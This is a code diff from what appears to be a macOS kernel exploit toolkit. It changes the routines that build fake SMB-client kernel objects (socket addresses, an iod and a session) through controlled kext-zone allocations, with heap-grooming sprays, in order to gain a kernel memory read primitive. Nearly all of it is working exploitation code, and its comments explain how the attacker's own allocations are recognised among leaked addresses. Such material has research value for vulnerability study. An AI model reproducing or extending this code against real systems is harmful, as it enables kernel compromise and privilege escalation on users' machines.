@@ -15,7 +15,7 @@
 #include <xe/util/log.h>
 
 #include "memory/allocator_nrnw.h"
-#include "memory/zkext_alloc_small.h"
+#include "memory/kheap_alloc.h"
 #include "smb/client.h"
 #include "smb/params.h"
 
@@ -58,10 +58,10 @@
 
 
 struct kmem_read_session {
-    struct kmem_zkext_alloc_small_entry sock_addr_alloc;
-    struct kmem_zkext_alloc_small_entry sock_addr_entry_alloc;
-    struct kmem_zkext_alloc_small_entry iod_alloc;
-    struct kmem_zkext_alloc_small_entry session_alloc;
+    struct xe_kheap_alloc_entry sock_addr_alloc;
+    struct xe_kheap_alloc_entry sock_addr_entry_alloc;
+    struct xe_kheap_alloc_entry iod_alloc;
+    struct xe_kheap_alloc_entry session_alloc;
     
     uintptr_t sock_addr_addr;
     uintptr_t sock_addr_entry_addr;
@@ -91,11 +91,11 @@ void kmem_read_session_fragment_kext_32(const struct sockaddr_in* smb_addr, kmem
 void kmem_read_session_build_sock_addr(kmem_read_session_t session, const struct sockaddr_in* smb_addr) {
     xe_assert_cond(session->sock_addr_addr, ==, 0);
     
-    /// kmem_zkext_alloc_small reads the address of allocated memory by reading the field `addr` of  `struct sock_addr_entry`
+    /// xe_kheap_alloc reads the address of allocated memory by reading the field `addr` of  `struct sock_addr_entry`
     /// allocated in kext.32 zone. Since there may be other `sock_addr_entry` with `addr` pointing to different data, we need a way to
     /// distinguish others from our allocation. To do this we set the size of allocated data to 224 which will get allocated in kext.224 zone.
     /// Now we can distinguish others by checking whether the leaked `sock_addr_entry->addr & (PAGE_SIZE - 1)` value is divisible by 224
-    struct kmem_zkext_alloc_small_entry entry = kmem_zkext_alloc_small(smb_addr, 224, AF_INET, (char*)&FAKE_SESSION_NIC_ADDR, sizeof(FAKE_SESSION_NIC_ADDR));
+    struct xe_kheap_alloc_entry entry = xe_kheap_alloc(smb_addr, 224, AF_INET, (char*)&FAKE_SESSION_NIC_ADDR, sizeof(FAKE_SESSION_NIC_ADDR), 8);
     
     /// First 8 bytes of the allocated memory is used for storing actual socket address (sin_len, sin_family, sin_port etc.)
     uintptr_t fake_sock_addr_addr = entry.address + 8;
@@ -118,7 +118,7 @@ void kmem_read_session_build_sock_addr_entry(kmem_read_session_t session, const 
     saddr_entry.addr = (struct sockaddr*)session->sock_addr_addr;
     
     /// Allocating on kext.160 to identify the correct address. See notes in kmem_read_session_build_sock_addr function
-    struct kmem_zkext_alloc_small_entry entry = kmem_zkext_alloc_small(smb_addr, 160, AF_INET, (char*)&saddr_entry, sizeof(saddr_entry));
+    struct xe_kheap_alloc_entry entry = xe_kheap_alloc(smb_addr, 160, AF_INET, (char*)&saddr_entry, sizeof(saddr_entry), 8);
     
     /// First 8 bytes of allocated memory is used for storing actual socket address
     uintptr_t fake_sock_addr_entry_addr = entry.address + 8;
@@ -182,7 +182,7 @@ void kmem_read_session_build_iod(kmem_read_session_t session, const struct socka
     assert(next_fake_iod->iod_flags == 0);
     next_fake_iod->iod_flags |= SMBIOD_RUNNING;
     
-    struct kmem_zkext_alloc_small_entry fake_iod_alloc = kmem_zkext_alloc_small(smb_addr, 255, AF_INET, (char*)&fake_iod + fake_iod_start, 255 - 8);
+    struct xe_kheap_alloc_entry fake_iod_alloc = xe_kheap_alloc(smb_addr, 255, AF_INET, (char*)&fake_iod + fake_iod_start, 255 - 8, 8);
     uintptr_t fake_iod_addr = fake_iod_alloc.address + 8 - fake_iod_start;
     
     session->iod_alloc = fake_iod_alloc;
@@ -203,7 +203,7 @@ void kmem_read_session_build_session(kmem_read_session_t session, const struct s
     xe_assert(session->nic_entry_addr != 0);
     xe_assert_cond(session->session_addr, ==, 0);
     
-    char kmem_read_session[256];
+    char kmem_read_session[216];
     bzero(kmem_read_session, sizeof(kmem_read_session));
     uintptr_t base = TYPE_SMB_SESSION_MEM_IOD_TAILQ_LOCK_OFFSET;
     
@@ -218,10 +218,10 @@ void kmem_read_session_build_session(kmem_read_session_t session, const struct s
     fake_nic_info->client_nic_count = 1;
     fake_nic_info->client_nic_info_list.tqh_first = (struct complete_nic_info_entry*)session->nic_entry_addr;
     
-    static_assert((TYPE_SMB_SESSION_MEM_SESSION_INTERFACE_TABLE_OFFSET + offsetof(struct session_network_interface_info, client_if_blacklist_len) - TYPE_SMB_SESSION_MEM_IOD_TAILQ_LOCK_OFFSET) <= 216, "");
+    static_assert((TYPE_SMB_SESSION_MEM_SESSION_INTERFACE_TABLE_OFFSET + offsetof(struct session_network_interface_info, client_if_blacklist_len) - TYPE_SMB_SESSION_MEM_IOD_TAILQ_LOCK_OFFSET) <= sizeof(kmem_read_session), "");
     
     /// Allocating on kext.224 to identify the correct address. See notes in kmem_read_session_build_sock_addr function
-    struct kmem_zkext_alloc_small_entry kmem_read_session_alloc = kmem_zkext_alloc_small(smb_addr, 224, AF_INET, kmem_read_session, 218);
+    struct xe_kheap_alloc_entry kmem_read_session_alloc = xe_kheap_alloc(smb_addr, 224, AF_INET, kmem_read_session, sizeof(kmem_read_session), 8);
     uintptr_t kmem_read_session_addr = kmem_read_session_alloc.address + 8 - base;
     
     session->session_alloc = kmem_read_session_alloc;
@@ -238,11 +238,12 @@ kmem_read_session_t kmem_read_session_create(const struct sockaddr_in* smb_addr)
     kmem_read_session_t kmem_read_session = malloc(sizeof(struct kmem_read_session));
     bzero(kmem_read_session, sizeof(struct kmem_read_session));
     
+    kmem_allocator_nrnw_allocate(nrnw_allocator, 32, XE_PAGE_SIZE / 32 * 16);
     kmem_read_session_build_sock_addr(kmem_read_session, smb_addr);
+    kmem_allocator_nrnw_allocate(nrnw_allocator, 32, XE_PAGE_SIZE / 32 * 16);
     kmem_read_session_build_sock_addr_entry(kmem_read_session, smb_addr);
+    kmem_allocator_nrnw_allocate(nrnw_allocator, 32, XE_PAGE_SIZE / 32 * 16);
     kmem_read_session_build_iod(kmem_read_session, smb_addr);
-    /// The fake sock_addr and fake smb_session is allocated on kext.224 zone.
-    /// To reduce the probability of mixup between fake sock_addr and fake smb_session address,
     kmem_allocator_nrnw_allocate(nrnw_allocator, 32, XE_PAGE_SIZE / 32 * 16);
     kmem_read_session_build_session(kmem_read_session, smb_addr);
     
